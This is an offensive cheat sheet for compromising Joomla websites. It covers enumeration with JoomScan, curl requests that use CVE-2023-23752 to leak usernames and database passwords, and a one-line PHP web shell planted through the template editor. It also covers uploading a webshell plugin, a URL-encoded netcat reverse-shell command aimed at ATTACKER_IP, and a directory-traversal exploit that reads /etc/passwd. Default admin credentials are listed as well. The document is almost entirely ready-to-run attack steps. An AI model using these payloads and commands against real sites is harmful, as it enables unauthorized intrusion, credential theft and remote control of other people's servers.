# Joomla

## Discovery

```bash
# Check robots.txt for Joomla paths
curl http://TARGET/robots.txt

# Version in XML
curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep version

# README file
curl -s http://TARGET/README.txt | head

# Login page
/administrator/
```

---

## Enumeration Tools

### JoomScan

```bash
# Install
apt install joomscan

# Basic scan
joomscan -u http://TARGET

# Enumerate components
joomscan -u http://TARGET -ec
```

### droopescan

```bash
# Also works for Joomla
droopescan scan joomla -u http://TARGET
```

---

## CVE-2023-23752 - Information Disclosure (Unauthenticated)

**Affects:** Joomla 4.0.0 - 4.2.7

Leaks usernames and database credentials via REST API without authentication.

### Manual Exploitation

```bash
# Leak usernames
curl -s "http://TARGET/api/index.php/v1/users?public=true" | jq

# Leak DB password (check all fields)
curl -s "http://TARGET/api/index.php/v1/config/application?public=true" | jq
```

### Automated Exploit

```bash
git clone https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT.git
python3 CVE-2023-23752.py -u http://TARGET
```

---

## Template Editor RCE (Authenticated)

1. Login to `/administrator` with admin creds
2. Navigate: `Extensions → Templates → Templates`
3. Select a template (e.g., `protostar`)
4. Edit `error.php` or another file
5. Add PHP web shell:

```php
system($_GET['cmd']);
```

6. Save and access:

```bash
curl http://TARGET/templates/protostar/error.php?cmd=id
```

---

## Webshell Plugin Upload (Authenticated)

Alternative to template editing - upload a malicious module.

### Setup

```bash
git clone https://github.com/p0dalirius/Joomla-webshell-plugin
cd Joomla-webshell-plugin
make
# Creates: ./dist/joomla-webshell-plugin-1.1.0.zip
```

### Upload

1. Login to `/administrator`
2. Navigate: `System → Install → Extensions`
   - Or directly: `/administrator/index.php?option=com_installer&view=install`
3. Upload the ZIP file
4. "Installation of the module was successful"

### Execute Commands

```bash
# Test
curl -X POST 'http://TARGET/modules/mod_webshell/mod_webshell.php' --data "action=exec&cmd=id"

# Reverse shell
curl -X POST 'http://TARGET/modules/mod_webshell/mod_webshell.php' \
  --data "action=exec&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7Csh%20-i%202%3E%261%7Cnc%20ATTACKER_IP%209001%20%3E/tmp/f"
```

---

## CVE-2019-10945 (Directory Traversal)

**Affects:** Joomla 1.5.0 - 3.9.4

**Requires:** Valid admin credentials

### Exploit

```bash
# List directory contents
python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /

# Read specific file
python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /etc/passwd
```

**PoC:** https://www.exploit-db.com/exploits/46710

---

## Config File

```bash
# Database credentials
/configuration.php

# Contains:
public $user = 'joomla_user';
public $password = 'password123';
public $db = 'joomla_db';
```

---

## Important Paths

| Path | Description |
|------|-------------|
| `/administrator/` | Admin login |
| `/configuration.php` | Main config (DB creds) |
| `/templates/` | Template files |
| `/plugins/` | Plugin directory |
| `/components/` | Components |
| `/modules/` | Modules |

---

## Default Credentials

```
admin:admin
administrator:administrator
```
